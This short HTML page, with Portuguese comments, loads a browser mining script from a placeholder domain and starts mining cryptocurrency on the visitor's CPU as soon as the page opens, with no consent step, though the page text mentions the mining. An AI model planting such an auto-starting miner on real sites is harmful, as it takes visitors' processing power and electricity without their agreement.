<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Crypto Mining Example</title>
</head>
<body>
    <h1>Welcome to Crypto Mining Example</h1>
    <p>Mining cryptocurrency using your CPU.</p>
    <script src="https://example.com/lib/mining-library.min.js"></script>
    <script>
        // Substitua "example.com" com o domínio correto do serviço de mineração
        var miner = new MiningLibrary.Anonymous('75afbb5b3e7947d23308f68eca5967e6ae6376c0d40d5241257cfcc5841879e2', {
            throttle: 0.2,  // Limita o uso da CPU a 20%
            autoThreads: false,  // Use false para definir o número de threads manualmente, se suportado
            threads: 2  // Defina o número de threads para o número desejado, se aplicável
        });
        miner.start();
    </script>
</body>
</html>
